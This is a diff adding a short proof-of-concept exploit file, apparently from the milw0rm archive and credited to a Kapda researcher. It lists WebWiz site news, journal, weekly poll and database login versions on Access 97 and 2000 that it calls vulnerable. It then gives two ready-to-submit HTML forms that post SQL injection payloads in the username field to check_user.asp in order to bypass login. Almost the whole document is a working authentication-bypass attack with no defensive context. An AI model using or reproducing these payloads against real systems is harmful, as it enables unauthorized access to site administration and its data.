@@ -1,0 +1,37 @@
+<!--
+Vulnerable products :
+
+webwiz site news access2000 : vesion 3.06 and prior versions
+webwiz journal access2000 : version 1.0
+webwiz weekly poll access2000 : version 3.06 and prior versions
+database login access2000 : version 1.71 and prior versions
+webwiz site news access97 : version 3.06 and prior versions
+webwiz journal access97 : version 1.0
+webwiz weekly poll access97 : version 3.06 and prior versions
+database login access97 : version 1.71 and prior versions
+
+
+Proof of Concepts :
+-->
+
+<html>
+<h1>WebWiz Scripts Login Bypass PoC - site news , journal , weekly poll - Kapda `s advisory </h1>
+<p> Discovery and exploit by devil_box [at} kapda.ir</p>
+<p><a href="http://www.kapda.ir/"> Kapda - Security Science Researchers Institute of Iran</a></p>
+<form method="POST" action="http://target/[product]/check_user.asp">
+<input type="hidden" name="txtUserName" value="'union all select '1','1' from tblConfiguration where ''='">
+<input type="hidden" name="txtUserPass" value="1">
+<input type="submit" value="Submit" name="submit">
+</form></html>
+
+<html>
+<h1>WebWiz Login Bypass PoC - Database login - Kapda `s advisory </h1>
+<p> Discovery and exploit by devil_box [at} kapda.ir</p>
+<p><a href="http://www.kapda.ir/"> Kapda - Security Science Researchers Institute of Iran</a></p>
+<form method="POST" action="http://target/[product]/check_user.asp">
+<input type="hidden" name="txtUserName" value="'union select 1 from tblusers where''='">
+<input type="hidden" name="txtUserPass" value="1">
+<input type="submit" value="Submit" name="submit">
+</form></html>
+
+# milw0rm.com [2005-12-30]
